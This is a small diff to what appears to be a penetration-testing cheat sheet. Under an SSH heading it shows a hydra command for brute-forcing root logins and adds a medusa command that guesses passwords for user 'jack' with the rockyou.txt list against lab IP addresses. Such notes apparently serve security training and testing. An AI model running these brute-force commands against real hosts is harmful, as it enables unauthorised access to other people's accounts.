@@ -88,6 +88,9 @@
 # SSH
 	1. Bruteforcing password authentication enabled ssh service with hydra
 		hydra -l root -P 500-worst-passwords.txt 10.10.10.10 ssh
+	2. Bruteforcing password authentication enabled ssh service with medusa
+	
+		medusa -u jack -P rockyou.txt -h 10.3.3.47 -M ssh -f -e ns -t 5
 		
 # Basic Authentication Brute
 
